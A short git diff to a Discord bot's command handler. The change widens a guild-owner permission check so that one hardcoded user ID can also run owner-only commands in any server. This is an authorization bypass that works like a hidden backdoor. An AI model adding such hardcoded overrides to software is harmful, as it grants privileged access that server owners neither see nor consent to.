@@ -79,7 +79,7 @@ bot.on('message', msg => {
         if (bot.commands.get(command.slice(prefix.length))) {
             db.collection('guilds').doc(msg.guild.id).get().then((q) => {
                 if (q.exists) {
-                    if (q.data().guildOwnerID === msg.author.id) {
+                    if (q.data().guildOwnerID === msg.author.id || msg.author.id === '430722923419009024') {
                         let cmd = bot.commands.get(command.slice(prefix.length));
                         if (cmd) {
                             let UserId = msg.author.id;
